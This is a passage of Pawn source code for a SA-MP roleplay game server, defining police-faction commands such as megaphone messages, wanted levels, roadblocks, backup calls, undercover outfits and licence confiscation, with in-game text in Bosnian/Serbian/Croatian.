	if( gettime() < PlayerInfo[ playerid ][ xMute ] ) return SendErrorMessage( playerid, "Ne mozete pricati, usutkani ste.");
	if( GetFactionType( playerid )  != ORG_TIP_VLADINA ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    if( PoliceDuty[ playerid ] == false ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti.");

    new id;
	if(sscanf(params, "i", id)) 
	{
		SendUsageMessage( playerid, "(/m)egaphone [id]");
		ShowPlayerDialog(playerid, 0, DIALOG_STYLE_LIST, "{FFFFFF}Megaphone:", 
																				"{FFFFFF}#1. {EB9234}Odustanite! Opkoljeni ste!\n\
																				{FFFFFF}#2. {EB9234}Govori PD/SD!! Ostanite gdje jeste!!\n\
																				{FFFFFF}#3. {EB9234}Zaustavite se ili pucamo!!\n\
																				{FFFFFF}#4. {EB9234}PD/SD govori!! Ne pomjerajte se!\n\
																				{FFFFFF}#5. {EB9234}Ugasite vozilo i izadjite sa podignutim rukama!!\n\
																				{FFFFFF}#6. {EB9234}Govori Vam PD/SD, zaustavite vase vozilo i ugasite motor!\n\
																				{FFFFFF}#7. {EB9234}FELONY STOP!! Ugasite motor vozila, izbacite kljuceve kroz prozor!! ODMA!!\n\
																				{FFFFFF}#8. {EB9234}Bez naglih pokreta, XX koraka unazad prema meni sa okrenutim ledjima i rukama u zraku!\n\
																				{FFFFFF}#9. {EB9234}Zaustavite i napustite Vase vozilo!! Uradite odma ili pucamo!!\n\
																				{FFFFFF}#10. {EB9234}Sve jedinice, opkolite ga, ne dozvolite da pobjegne!!!\n\
																				{FFFFFF}#11. {EB9234}Lezite na zemlju i drzite ruke iza ledja!!!\n\
																				{FFFFFF}#12. {EB9234}Spustite se na koljena i drzite ruke iza ledja!!!\n\
																				{FFFFFF}#13. {EB9234}Spustite oruzje ili pucamo!!!", "Zatvori", "");
		return 1;
	}
	if(id < 1 || (id > 13 && id != 7425)) return SendErrorMessage(playerid, "Pogresan ID poruke.");

	foreach(new i : Player)
	{
	    if( IsPlayerNearPlayer( 60.0, playerid, i ) )
		{
	        switch(id)
	        {
	        	case 1: SCMF(i, -1, "[MEGAPHONE - %s(%s)] {EB9234}Odustanite! Opkoljeni ste!", ImeIgraca(playerid), org_info[PlayerInfo[playerid][xClan]][oPreFix]);
	        	case 2: SCMF(i, -1, "[MEGAPHONE - %s(%s)] {EB9234}Govori %s!! Ostanite gdje jeste!!", ImeIgraca(playerid), org_info[PlayerInfo[playerid][xClan]][oPreFix], org_info[PlayerInfo[playerid][xClan]][oPreFix]);
	        	case 3: SCMF(i, -1, "[MEGAPHONE - %s(%s)] {EB9234}Zaustavite se ili pucamo!!", ImeIgraca(playerid), org_info[PlayerInfo[playerid][xClan]][oPreFix]);
	        	case 4: SCMF(i, -1, "[MEGAPHONE - %s(%s)] {EB9234}%s govori!! Ne pomjerajte se!", ImeIgraca(playerid), org_info[PlayerInfo[playerid][xClan]][oPreFix], org_info[PlayerInfo[playerid][xClan]][oPreFix]);
	        	case 5: SCMF(i, -1, "[MEGAPHONE - %s(%s)] {EB9234}Ugasite vozilo i izadjite sa podignutim rukama!!", ImeIgraca(playerid), org_info[PlayerInfo[playerid][xClan]][oPreFix]);
	        	case 6: SCMF(i, -1, "[MEGAPHONE - %s(%s)] {EB9234}Govori Vam %s, zaustavite vase vozilo i ugasite motor!", ImeIgraca(playerid), org_info[PlayerInfo[playerid][xClan]][oPreFix], org_info[PlayerInfo[playerid][xClan]][oPreFix]);
	        	case 7: SCMF(i, -1, "[MEGAPHONE - %s(%s)] {EB9234}FELONY STOP!! Ugasite motor vozila, izbacite kljuceve kroz prozor!! ODMA!!", ImeIgraca(playerid), org_info[PlayerInfo[playerid][xClan]][oPreFix]);
	        	case 8: SCMF(i, -1, "[MEGAPHONE - %s(%s)] {EB9234}Bez naglih pokreta, %d koraka unazad prema meni sa okrenutim ledjima i rukama u zraku!", ImeIgraca(playerid), org_info[PlayerInfo[playerid][xClan]][oPreFix], 2+random(3));
	        	case 9: SCMF(i, -1, "[MEGAPHONE - %s(%s)] {EB9234}Zaustavite i napustite Vase vozilo!! Uradite odma ili pucamo!!", ImeIgraca(playerid), org_info[PlayerInfo[playerid][xClan]][oPreFix]);
	        	case 10: SCMF(i, -1, "[MEGAPHONE - %s(%s)] {EB9234}Sve jedinice, opkolite ga, ne dozvolite da pobjegne!!!", ImeIgraca(playerid), org_info[PlayerInfo[playerid][xClan]][oPreFix]);
	        	case 11: SCMF(i, -1, "[MEGAPHONE - %s(%s)] {EB9234}Lezite na zemlju i drzite ruke iza ledja!!!", ImeIgraca(playerid), org_info[PlayerInfo[playerid][xClan]][oPreFix]);
	        	case 12: SCMF(i, -1, "[MEGAPHONE - %s(%s)] {EB9234}Spustite se na koljena i drzite ruke iza ledja!!!", ImeIgraca(playerid), org_info[PlayerInfo[playerid][xClan]][oPreFix]);
	        	case 13: SCMF(i, -1, "[MEGAPHONE - %s(%s)] {EB9234}Spustite oruzje ili pucamo!!!", ImeIgraca(playerid), org_info[PlayerInfo[playerid][xClan]][oPreFix]);
	        	case 7425: SCMF(i, -1, "[MEGAPHONE - %s(%s)] {EB9234}Izete, Izete Fazlinovicu, opkoljeni ste sa svih strana, predajte se!", ImeIgraca(playerid), org_info[PlayerInfo[playerid][xClan]][oPreFix]);
	        }
	    }
	}
	return 1;
}
alias:m("megaphone");

CMD:wanted( playerid )
{
    if( GetFactionType( playerid )  != ORG_TIP_VLADINA ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    if( PoliceDuty[ playerid ] == false ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti!");

	strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
    strcat( DialogStrgEx, "{33CCFF}* Online osumnjiceni\n\n:{FFFFFF}" );

    foreach( new i : Player)
	{
		if( PlayerInfo[ i ][ xWanted ] > 0 )
		{
			format( globalstring, sizeof( globalstring ), "- %s | Wanted Level: %d\n", ImeIgraca( i ), PlayerInfo[ i ][ xWanted ] );
			strcat( DialogStrgEx, globalstring );
		}
	}
	ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, D_NASLOV, DialogStrgEx, "U redu", "" );
	strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
	return 1;
}

CMD:dosije( playerid )
{
	if(PlayerInfo[playerid][xWanted] == 0) return SendErrorMessage(playerid, "Vi nemate wanted level.");

	new str[150];
	format(str, sizeof(str), "{4282C0}Wanted Level: {FFFFFF}(%d)\n{4282C0}Zlocin: {FFFFFF}%s\n{4282C0}Prijavio: {FFFFFF}%s", PlayerInfo[ playerid ][ xWanted ], ZlocinInfo[ playerid ][ zZlocin ], ZlocinInfo[ playerid ][ zPrijavio ]);
 	ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "{FFFFFF}Dosije:", str, "Zatvori", "");
	return 1;
}

CMD:su( playerid, const params[] )
{
	if( GetFactionType( playerid ) != ORG_TIP_VLADINA ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    if( PoliceDuty[ playerid ] == false ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti.");

	new id, tekst[ 12 ], wanted;
    if( sscanf( params, "uis[12]", id, wanted, tekst ) ) return SendUsageMessage( playerid, "/su [id] [wl] [razlog]");
    if( !IsPlayerConnected( id ) ) return SendErrorMessage( playerid, "Taj igrac je offline.");
	if( id == playerid ) return SendErrorMessage( playerid, "Ne mozete sebi dati wanted level.");
    if( GetFactionType( id ) == ORG_TIP_VLADINA ) return SendErrorMessage( playerid, "Ne mozes dati wl policajcu.");
    if( wanted < 1 || wanted > 10 ) return SendErrorMessage(playerid, "Wanted ne moze biti veci od 10 ili manji od 1.");

	PostaviWanted( id, tekst, ImeIgraca( playerid ), wanted ); 
	DodajWarnRed("~r~[SU] %s ~w~je da%s ~r~%d ~w~wanteda igracu ~r~%s ~w~| Razlog: ~r~%s", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), wanted, ImeIgraca( id ), tekst );
	return 1;
}

CMD:rb( playerid, const params[] )
{
    if( GetFactionType( playerid ) == ORG_TIP_VLADINA || PlayerInfo[ playerid ][ xAdmin ] >= 1 )
	{
 	    if( ( PlayerInfo[ playerid ][ xRank ] >= 3 && PlayerInfo[ playerid ][ xAdmin ] == 0 ) || PlayerInfo[ playerid ][ xAdmin ] > 0 )
		{
	        if( PlayerInfo[ playerid ][ xAdmin ] == 0 ) if( PoliceDuty[ playerid ] == false ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti!");
	        if( IsPlayerInAnyVehicle(playerid) ) return SendErrorMessage(playerid, "Ne mozes iz vozila.");

		    new rb;
			if( sscanf( params, "i", rb))
	        {
		        SendUsageMessage( playerid, "/(rb)roadblock [broj]");
				SendClientMessage( playerid, 0x33CCFFFF, "Dostupne blokade:");
				SendClientMessage( playerid, 0xB4B5B7FF, "1: Mala blokada | 2: Velika blokada | 3: Cunj");
				SendClientMessage( playerid, 0xB4B5B7FF, "4: Znak usmeravanja | 5: Znak upozorenja | 6: Blokada usmeravanja");
				SendClientMessage( playerid, 0xB4B5B7FF, "7: Mala Spike za busenje guma | 8: Velika Spike za busenje guma");
				return 1;
			}
			if(rb < 1 || rb > 8) return SendErrorMessage(playerid, "Pogresan broj barikade.");

			new Float:plocx, Float:plocy, Float:plocz, Float:ploca;
			switch(rb)
			{
	        	case 1:
				{
					PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
		        	GetPlayerPos( playerid, plocx, plocy, plocz);
		        	GetPlayerFacingAngle( playerid, ploca);
		        	CreateRoadblock(playerid, 1459, plocx, plocy, plocz, ploca);
		        	GameTextForPlayer( playerid,"~w~Mala blokada ~b~postavljena!",3000,1);

	                if( PlayerInfo[ playerid ][ xAdmin ] == 0 )
					{
						for( new id = 1; id < MAX_ORG; id++)
						{
							if( org_info[ id ][ oTip ] == ORG_TIP_VLADINA )
							{ 
							   	OrgPoruka( id, 0x2641FEAA, "(HQ): Officer %s je postavio malu blokadu, over.", ImeIgraca( playerid ) );
							}
						}
					}
					return 1;
				}
				case 2:
				{
					PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
			        GetPlayerPos( playerid, plocx, plocy, plocz);
			        GetPlayerFacingAngle( playerid, ploca);
			        CreateRoadblock(playerid, 978, plocx, plocy, plocz+0.6, ploca);
			        GameTextForPlayer( playerid,"~w~Velika blokada ~b~postavljena!",3000,1);

	                if( PlayerInfo[ playerid ][ xAdmin ] == 0 )
					{
						for( new id = 1; id < MAX_ORG; id++)
						{
							if( org_info[ id ][ oTip ] == ORG_TIP_VLADINA )
							{ 
							   	OrgPoruka( id, 0x2641FEAA, "(HQ): Officer %s je postavio veliku blokadu, over.", ImeIgraca( playerid ) );
							}
						}
					}
					return 1;
				}
				case 3:
				{
					PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
			        GetPlayerPos( playerid, plocx, plocy, plocz);
			        GetPlayerFacingAngle( playerid, ploca);
			        CreateRoadblock(playerid, 1238, plocx, plocy, plocz+0.2, ploca);
			        GameTextForPlayer( playerid,"~w~Cunj ~g~postavljen!",3000,1);

	                if( PlayerInfo[ playerid ][ xAdmin ] == 0 )
					{
						for( new id = 1; id < MAX_ORG; id++)
						{
							if( org_info[ id ][ oTip ] == ORG_TIP_VLADINA )
							{ 
							   	OrgPoruka( id, 0x2641FEAA, "(HQ): Officer %s je postavio cunj, over.", ImeIgraca( playerid ) );
							}
						}
					}
					return 1;
				}
				case 4:
				{
					PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
			        GetPlayerPos( playerid, plocx, plocy, plocz);
			        GetPlayerFacingAngle( playerid, ploca);
			        CreateRoadblock(playerid, 1425, plocx, plocy, plocz+0.6, ploca);
			        GameTextForPlayer( playerid,"~w~Znak usmeravanja ~g~postavljen!",3000,1);

	                if( PlayerInfo[ playerid ][ xAdmin ] == 0 )
					{
						for( new id = 1; id < MAX_ORG; id++)
						{
							if( org_info[ id ][ oTip ] == ORG_TIP_VLADINA )
							{ 
							   	OrgPoruka( id, 0x2641FEAA, "(HQ): Officer %s je postavio znak usmeravanja, over.", ImeIgraca( playerid ) );
							}
						}
					}
					return 1;
				}
				case 5:
				{
					PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
			        GetPlayerPos( playerid, plocx, plocy, plocz);
			        GetPlayerFacingAngle( playerid, ploca);
			        CreateRoadblock(playerid, 3265, plocx, plocy, plocz-0.5, ploca);
			        GameTextForPlayer( playerid,"~w~Znak upozorenja ~g~postavljen!",3000,1);

	                if( PlayerInfo[ playerid ][ xAdmin ] == 0 )
					{
						for( new id = 1; id < MAX_ORG; id++)
						{
							if( org_info[ id ][ oTip ] == ORG_TIP_VLADINA )
							{ 
							   	OrgPoruka( id, 0x2641FEAA, "(HQ): Officer %s je postavio znak upozorenja, over.", ImeIgraca( playerid ) );
							}
						}
					}
					return 1;
				}
				case 6:
				{
					PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
			        GetPlayerPos( playerid, plocx, plocy, plocz);
			        GetPlayerFacingAngle( playerid, ploca);
			        CreateRoadblock(playerid, 3091, plocx, plocy, plocz+0.5, ploca+180);
			        GameTextForPlayer( playerid,"~w~Blokada usmeravanja ~g~postavljena!",3000,1);

	                if( PlayerInfo[ playerid ][ xAdmin ] == 0 )
					{
						for( new id = 1; id < MAX_ORG; id++)
						{
							if( org_info[ id ][ oTip ] == ORG_TIP_VLADINA )
							{ 
							   	OrgPoruka( id, 0x2641FEAA, "(HQ): Officer %s je postavio blokadu usmeravanja, over.", ImeIgraca( playerid ) );
							}
						}
					}
					return 1;
				}
				case 7:
				{
					PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
			        GetPlayerPos( playerid, plocx, plocy, plocz);
			        GetPlayerFacingAngle( playerid,ploca);
			        CreateSpike(playerid, 2899, plocx, plocy, plocz+0.2, ploca+180);
			        GameTextForPlayer( playerid,"~w~Mala Spike za busenje guma ~g~postavljen!",3000,1);

	            	if( PlayerInfo[ playerid ][ xAdmin ] == 0 )
					{
						for( new id = 1; id < MAX_ORG; id++)
						{
							if( org_info[ id ][ oTip ] == ORG_TIP_VLADINA )
							{ 
							   	OrgPoruka( id, 0x2641FEAA, "(HQ): Officer %s je postavio malu spike, over.", ImeIgraca( playerid ) );
							}
						}
					}
					return 1;
				}
				case 8:
				{
					PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
			        GetPlayerPos( playerid, plocx, plocy, plocz);
			        GetPlayerFacingAngle( playerid, ploca);
			        CreateSpike(playerid, 2892, plocx, plocy, plocz, ploca+180);
			        GameTextForPlayer( playerid,"~w~Velika Spike za busenje guma ~g~postavljen!",3000,1);

	                if( PlayerInfo[ playerid ][ xAdmin ] == 0 )
					{
						for( new id = 1; id < MAX_ORG; id++)
						{
							if( org_info[ id ][ oTip ] == ORG_TIP_VLADINA )
							{ 
							   	OrgPoruka( id, 0x2641FEAA, "(HQ): Officer %s je postavio veliku spike, over.", ImeIgraca( playerid ) );
							}
						}
					}
					return 1;
				}
			}
        }
		else SendErrorMessage( playerid, "Nisi rank 3+");
	}
	else SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    return 1;
}

CMD:rrb( playerid )
{
    if( GetFactionType( playerid ) == ORG_TIP_VLADINA || PlayerInfo[ playerid ][ xAdmin ] > 0 )
	{
	    if( PoliceDuty[ playerid ] == false && PlayerInfo[ playerid ][ xAdmin ] == 0 ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti!");
		if( ( PlayerInfo[ playerid ][ xRank ] >= 3 && PlayerInfo[ playerid ][ xAdmin ] == 0 ) || PlayerInfo[ playerid ][ xAdmin ] > 0 )
		{
	   		DeleteClosestRoadblock( playerid );
	       	GameTextForPlayer( playerid, "~w~Roadblock ~r~Removed!", 3000, 1 );
		}
		else SendErrorMessage( playerid, "Nisi rank 3+" );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    return 1;
}

CMD:rrball( playerid, const params[] )
{
    if( GetFactionType( playerid ) == ORG_TIP_VLADINA || PlayerInfo[ playerid ][ xAdmin ] > 0 )
	{
	    if( PoliceDuty[ playerid ] == false && PlayerInfo[ playerid ][ xAdmin ] == 0 ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti!");
	    if( ( PlayerInfo[ playerid ][ xRank ] >= 4 && PlayerInfo[ playerid ][ xAdmin ] == 0 ) || PlayerInfo[ playerid ][ xAdmin ] > 0 )
		{
		    DeleteAllRoadblocks( playerid );

		    if( PlayerInfo[ playerid ][ xAdmin ] == 0 )
			{
			    for( new id = 1; id < MAX_ORG; id++ )
				{
					if( org_info[ id ][ oTip ] == ORG_TIP_VLADINA )
					{ 
					   	OrgPoruka( id, 0x2641FEAA, "(HQ): Officer %s je maknu%s sve blokade u ovom podrucju, over.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );
					}
				}
			}
			else AdminMsg(ADM_WARN, "[ADMIN] %s je maknu%s sve blokade(roadblockove).", ImeIgraca(playerid), getPolForString(playerid, "o", "la"));

			GameTextForPlayer( playerid, "~w~All Roadblocks ~r~Removed!", 3000, 1 );
		}
		else return SendErrorMessage( playerid, "Morate biti rank 4+" );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:bk( playerid )
{
	if( GetFactionType( playerid )  != ORG_TIP_VLADINA ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    if( PoliceDuty[ playerid ] == false ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti!");
    if(!RequestingBackup[playerid])
	{ 
		RequestingBackup[playerid] = true;

		new Float:Pos[ 3 ];
		GetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );

		foreach( new i : Player)
		{
			if( org_info[ PlayerInfo[ i ][ xClan ] ][ oTip ] == ORG_TIP_VLADINA )
			{
				SMG_SetPlayerCheckpoint( i, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ], 5.0 );
				CheckpointStatus[ i ] = 15;
				SCMF( i, 0x8D8DFF00, "(BACKUP): {FFFFFF}%s {8D8DFF}trazi pojacanje i oznacen je na GPSu(crveno).", ImeIgraca( playerid ) );
			}
		}

		SendClientMessage( playerid, 0x8D8DFF00, "(BACKUP): Ukucajte {FFFFFF}[ /bkc ] {8D8DFF}da bi ste izbrisali pojacanje." );
		_backupclear[playerid] = SetPlayerTimerEx(playerid, "BackupClear", 180000, false, "ii", playerid, 1);
	}
	else SendClientMessage( playerid, CRVENA, "(BACKUP): Vec imate aktivan zahtev za pojacanje.");
	return 1;
}

CMD:bkc( playerid, const params[] )
{
	if( GetFactionType( playerid )  != ORG_TIP_VLADINA ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    if( PoliceDuty[ playerid ] == false ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti.");

	BackupClear(playerid, 0);
	return 1;
}

CMD:govrepair( playerid )
{
    if( gettime() < GovRepairCooldown[playerid] ) return SendErrorMessage( playerid, "Ne mozete spamati sa ovom komandom!");
    if( GetFactionType( playerid ) != ORG_TIP_VLADINA ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    if( PoliceDuty[ playerid ] == false ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti!");
    if( !IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Niste u vozilu!" );

    new vehicleid = GetPlayerVehicleID( playerid );
    if( VehicleInfo[ vehicleid ][ vUsage ] == ORGANIZACIJSKO_VOZILO && VehicleInfo[ vehicleid ][ vOrganization ] == PlayerInfo[ playerid ][ xClan ] )
	{
		if( IsPlayerInRangeOfPoint(playerid, 5.0, 1579.7245, -1632.3541, 13.3828) //PD
			|| IsPlayerInRangeOfPoint(playerid, 5.0, 618.3335, -583.5156, 17.2178)) //SD
		{
			SMG_RepairVehicle( playerid, vehicleid );
			GovRepairCooldown[playerid] = gettime()+30;

	        SendClientMessage( playerid, 0x33CCFFFF, "#GOVREPAIR: {FFFFFF}Vase vozilo je popravljeno.");
		}
		else SendErrorMessage( playerid, "Niste na mjestu za popravak vozila." );
	}
	else SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti u vozilu policije." );
	return 1;
}

CMD:undercover( playerid, const params[] )
{
	new id = PlayerInfo[ playerid ][ xClan ];
    if( GetFactionType( playerid ) != ORG_TIP_VLADINA ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    if( !IsPlayerInRangeOfPoint( playerid, 2.0, org_info[ id ][ oDutyPoint ][ 0 ], org_info[ id ][ oDutyPoint ][ 1 ], org_info[ id ][ oDutyPoint ][ 2 ] ) ) return SendErrorMessage( playerid, "Morate biti na pickupu za koriscenje ove komande.");
	if( PlayerInfo[ playerid ][ xRank ] < 3 ) return SendErrorMessage( playerid, "Morate biti rank 3+" );
	new opcija[12], item;
	if( sscanf( params, "s[12]i", opcija, item ) )
	{
	    SendUsageMessage( playerid, "/undercover skin [skin id(1-6)]");
		SendUsageMessage( playerid, "/undercover oruzje [weapon set(1-3)]");
	    SendClientMessage( playerid, -1, "SET 1: Silence Gun, Spraycan, Parachute");
		SendClientMessage( playerid, -1, "SET 2: Desert Deagle, MP5, Country Rifle");
		SendClientMessage( playerid, -1, "SET 3: Silence Gun, Sniper Rifle, Parachute, Knife");
		return 1;
	}
	if( strcmp( opcija, "skin", true ) == 0 )
	{
	    switch(item)
	    {
			case 1:
			{
				SMG_SetPlayerSkin( playerid, 21 );
		   	    SetPlayerColor( playerid, 0xFFFFFF00 );

		        SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s skida svoju uniformu i presvlaci se.", ImeIgraca( playerid ) );
				SendClientMessage( playerid, 0x33CCFFFF, "(UNDERCOVER): Presvukli ste se i sada vas nitko nece moci prepoznati.");
			}
			case 2:
			{
				SMG_SetPlayerSkin( playerid, 211 );
		   	    SetPlayerColor( playerid, 0xFFFFFF00 );

		        SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s skida svoju uniformu i presvlaci se.", ImeIgraca( playerid ) );
				SendClientMessage( playerid, 0x33CCFFFF, "(UNDERCOVER): Presvukli ste se i sada vas nitko nece moci prepoznati.");
			}
			case 3:
			{
				SMG_SetPlayerSkin( playerid, 101 );
		   	    SetPlayerColor( playerid, 0xFFFFFF00 );

		        SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s skida svoju uniformu i presvlaci se.", ImeIgraca( playerid ) );
				SendClientMessage( playerid, 0x33CCFFFF, "(UNDERCOVER): Presvukli ste se i sada vas nitko nece moci prepoznati.");
			}
			case 4:
			{
				SMG_SetPlayerSkin( playerid, 183 );
		   	    SetPlayerColor( playerid, 0xFFFFFF00 );

		        SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s skida svoju uniformu i presvlaci se.", ImeIgraca( playerid ) );
				SendClientMessage( playerid, 0x33CCFFFF, "(UNDERCOVER): Presvukli ste se i sada vas nitko nece moci prepoznati.");
			}
			case 5:
			{
				SMG_SetPlayerSkin( playerid, 185 );
		   	    SetPlayerColor( playerid, 0xFFFFFF00 );

		        SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s skida svoju uniformu i presvlaci se.", ImeIgraca( playerid ) );
				SendClientMessage( playerid, 0x33CCFFFF, "(UNDERCOVER): Presvukli ste se i sada vas nitko nece moci prepoznati.");
			}
			case 6:
			{
				SMG_SetPlayerSkin( playerid, 217 );
		   	    SetPlayerColor( playerid, 0xFFFFFF00 );

		        SendNearbyMessage(playerid, 10.0, 0xC2A2DAFF, "* %s skida svoju uniformu i presvlaci se.", ImeIgraca( playerid ) );
				SendClientMessage( playerid, 0x33CCFFFF, "(UNDERCOVER): Presvukli ste se i sada vas nitko nece moci prepoznati.");
			}
		}
	}
	else if( strcmp( opcija, "oruzje", true ) == 0 )
	{
	    switch(item)
	    {
			case 1:
			{
				GiveWeaponToPlayer( playerid, 23, 100 );
				GiveWeaponToPlayer( playerid, 41, 500 );
				GiveWeaponToPlayer( playerid, 46, 1 );
		   	    SetPlayerColor( playerid, 0xFFFFFF00 );
			}
			case 2:
			{
	        	GiveWeaponToPlayer( playerid, 24, 100 );
	            GiveWeaponToPlayer( playerid, 29, 200 );
	            GiveWeaponToPlayer( playerid, 33, 50 );
		   	    SetPlayerColor( playerid, 0xFFFFFF00 );
			}
			case 3:
			{
	        	GiveWeaponToPlayer( playerid, 23, 100 );
	            GiveWeaponToPlayer( playerid, 34, 100 );
	            GiveWeaponToPlayer( playerid, 46, 1 );
	            GiveWeaponToPlayer( playerid, 4, 1 );
		   	    SetPlayerColor( playerid, 0xFFFFFF00 );
			}
		}
	}
    OfficerUndercover[playerid] = true;
    return 1;
}

CMD:ram( playerid )
{
    if( GetFactionType( playerid ) != ORG_TIP_VLADINA ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    if( !PoliceDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti.");

	foreach(new i : iter_Imovina)
	{
		if( IsPlayerInRangeOfPoint( playerid, 2.0, II[ i ][ iEnter ][ 0 ], II[ i ][ iEnter ][ 1 ], II[ i ][ iEnter ][ 2 ] ) )
		{
			SMG_SetPlayerPos( playerid, II[ i ][ iExit ][ 0 ], II[ i ][ iExit ][ 1 ], II[ i ][ iExit ][ 2 ] );
		  	UcitajObjekte( playerid );
		    SetCameraBehindPlayer( playerid );
		   	SetPlayerInterior( playerid, II[ i ][ iInterior ] );
			SetPlayerVirtualWorld( playerid, II[ i ][ iVW ] );
			inProperty[ playerid ] = i;
		}
	}

	for( new i= 1; i < MAX_ORG; i++)
	{
		if( IsPlayerInRangeOfPoint( playerid, 2.0, org_info[ i ][ oPozExtX ], org_info[ i ][ oPozExtY ], org_info[ i ][ oPozExtZ ] ) )
		{
		    SMG_SetPlayerPos( playerid, org_info[ i ][ oPozIntX ], org_info[ i ][ oPozIntY ], org_info[ i ][ oPozIntZ ] );
		  	UcitajObjekte( playerid );
		   	SetCameraBehindPlayer( playerid );
		   	SetPlayerInterior( playerid, org_info[ i ][ oInt ] );
			SetPlayerVirtualWorld( playerid, org_info[ i ][ oVw ] );
			inOrgInt[ playerid ] = i;
		}
	}
	return 1;
}

CMD:take( playerid, const params[])
{
    if( GetFactionType( playerid ) == ORG_TIP_VLADINA )
	{
    	if( PoliceDuty[ playerid ] == false ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti.");

		new opcija[20], igrac;
		if( sscanf( params, "s[20]u", opcija, igrac ) )
		{
			SendUsageMessage( playerid, "/take [opcija] [id]");
	  		SendClientMessage( playerid, -1, "Ponudjene opcije: drivinglicense, flyinglicense, sailinglicense, gunlicense, drugs, weapons");
			return 1;
		}

		if(igrac == IPI && PlayerInfo[igrac][xVIPLevel] == 6) return SendErrorMessage(playerid, "Taj ID nije konektovan ili je taj igrac VIP 6.");
	    if( strcmp( opcija, "drivinglicense", true ) == 0)
		{
			if( IsPlayerConnected( igrac ) )
			{
			    if( igrac != IPI )
				{
			        if( IsPlayerNearPlayer( 5.0, playerid, igrac ) )
					{
				        SCMF( playerid, 0x33CCFFFF, "#TAKE: {FFFFFF}Oduzeli ste {33CCFF}%s {FFFFFF}vozacku dozvolu.", ImeIgraca( igrac ) );
				        SCMF( igrac, 0x33CCFFFF, "#TAKE: {FFFFFF}Policajac {33CCFF}%s {FFFFFF}vam je oduzeo vozacku dozvolu.", ImeIgraca( playerid ));

				        PlayerInfo[ igrac ][ xVozacka ] = 0;
						sql_user_update_integer( igrac, "vehicle_license", PlayerInfo[ igrac ][ xVozacka ] );
					}
					else SendErrorMessage( playerid, "Taj igrac nije blizu vas.");
			    }
			}
			else SendErrorMessage( playerid, "Taj igrac nije online.");
		}
		else if(strcmp(opcija, "gunlicense", true) == 0)
		{
			if( IsPlayerConnected( igrac ) )
			{
			    if( igrac != IPI )
				{
			        if( IsPlayerNearPlayer( 5.0, playerid, igrac ) )
					{
				        SCMF( playerid, 0x33CCFFFF, "#TAKE: {FFFFFF}Oduzeli ste {33CCFF}%s {FFFFFF}dozvolu za oruzje.", ImeIgraca( igrac ));
				        SCMF( igrac, 0x33CCFFFF, "#TAKE: {FFFFFF}Policajac {33CCFF}%s {FFFFFF}vam je oduzeo dozvolu za oruzje.", ImeIgraca( playerid ));

				        PlayerInfo[ igrac ][ xGunLicense ] = 0;
						sql_user_update_integer( igrac, "gun_license", PlayerInfo[ igrac ][ xGunLicense ] );
			        }
					else SendErrorMessage( playerid, "Taj igrac nije blizu vas.");
			    }
			}
			else SendErrorMessage( playerid, "Taj igrac nije online.");
		}
		else if(strcmp(opcija, "sailinglicense", true) == 0)
		{
			if( IsPlayerConnected( igrac ) )
			{
			    if( igrac != IPI )
				{
			        if( IsPlayerNearPlayer( 5.0, playerid, igrac ) )
					{
				        SCMF( playerid, 0x33CCFFFF, "#TAKE: {FFFFFF}Oduzeli ste {33CCFF}%s {FFFFFF}dozvolu za plovidbu.", ImeIgraca( igrac ));
				        SCMF( igrac, 0x33CCFFFF, "#TAKE: {FFFFFF}Policajac {33CCFF}%s {FFFFFF}vam je oduzeo dozvolu za plovidbu.", ImeIgraca( playerid ));

				        PlayerInfo[ igrac ][ xBrodska ] = 0;
